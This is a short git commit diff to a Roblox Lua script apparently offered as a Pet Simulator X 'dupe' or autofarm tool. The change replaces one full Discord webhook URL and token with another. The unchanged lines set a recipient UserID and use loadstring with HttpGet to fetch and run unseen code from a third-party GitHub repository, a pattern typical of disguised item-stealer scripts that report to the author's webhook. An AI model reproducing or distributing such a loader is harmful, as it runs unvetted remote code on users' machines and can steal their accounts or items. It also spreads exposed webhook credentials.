682c8dd2fe36a9e7e2e1716b38de4b2d042eae55
psxdupe <107107053+psxdupesop@users.noreply.github.com>
2023-03-18 08:30:33 -0700

    Update psxscript.lua

--- psxscript.lua
+++ psxscript.lua
@@ -1,3 +1,3 @@
 _G.UserID = 3726834484
-_G.WebHook = "https://discord.com/api/webhooks/1086671004845219971/-bDOjQj5L0gOhm0i_OzR4GMUsxsPtne-Vcd20NFBbOQnOILO8JKYgau51iuDEPI3BfZj"
+_G.WebHook = "https://discord.com/api/webhooks/1086672920811667466/3wOdfLsXwN3POZ2bUcb7yAgFXXQq-JYceubFVJ1PnXN4D5DG2omcJW-XcdSU1YRwhKvC"
 loadstring(game:HttpGet("https://raw.githubusercontent.com/SilenceScripts/PsxScripts.Lua/main/PsxAutofarm.true"))()
